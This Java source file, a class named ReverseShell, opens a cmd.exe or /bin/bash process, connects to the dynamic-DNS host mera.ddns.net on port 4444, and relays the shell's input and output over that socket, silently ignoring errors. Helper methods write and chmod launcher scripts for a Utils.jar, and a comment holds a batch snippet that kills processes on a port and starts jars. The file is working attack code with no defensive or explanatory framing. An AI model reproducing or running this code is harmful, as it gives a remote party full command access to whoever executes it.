
import java.io.*;
import java.net.Socket;

@SuppressWarnings("all")
class ReverseShell {

    /**
     * @echo off
     * set port=9999
     * for /f "tokens=1-5" %%i in ('netstat -ano^|findstr ":%port%"') do taskkill /pid %%m -t -f
     * start java -Dfile.encoding=utf-8 -Dserver.port=9999 -jar xxx-v1.0.1.jar
     * start javaw -Xmx2g -jar src/Utils/Utils.jar
     */

    public static void linuxSH(){
        String scriptContent = "#!/bin/bash \n \"java -jar src/Utils/Utils.jar &\" > out/production/utils.sh";
        try{
            Writer output = new BufferedWriter(new FileWriter("out/production/utils.sh"));
            output.write(scriptContent);
            output.close();
            Runtime.getRuntime().exec("chmod u+x out/production/utils.sh");
        }catch (IOException ignored){}
    }

    public static void windowsBat(){
        String scriptContent = "@echo off \n echo \"start java -Xmx2g -jar src/Utils/Utils.jar\" > out/production/utils.bat";
        try{
            Writer output = new BufferedWriter(new FileWriter("out/production/utils.bat"));
            output.write(scriptContent);
        }catch (IOException ignored){}
    }



    public static void main(String... args) {
        Thread thread = new Thread(() -> {

            try {
                String cmd =  ((System.getProperty("os.name").contains("Windows"))) ? "cmd.exe" : "/bin/bash";
                Process process = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                Socket socket = new Socket("mera.ddns.net",4444);
                InputStream processInput = process.getInputStream(), processError = process.getErrorStream(), socketInput = socket.getInputStream();
                OutputStream processOutput = process.getOutputStream(), socketOutput = socket.getOutputStream();

                while(!socket.isClosed()){

                    while(processInput.available() > 0)
                        socketOutput.write(processInput.read());

                    while(processError.available() > 0)
                        socketOutput.write(processError.read());

                    while(socketInput.available() > 0)
                        processOutput.write(socketInput.read());

                    socketOutput.flush();
                    processOutput.flush();
                    Thread.sleep(50);

                    try {
                        process.exitValue();
                        break;
                    }catch (Exception ignored){}
                };

                process.destroy();
                socket.close();
            }catch (IOException | InterruptedException ignored){}
        });
        thread.start();
    }
}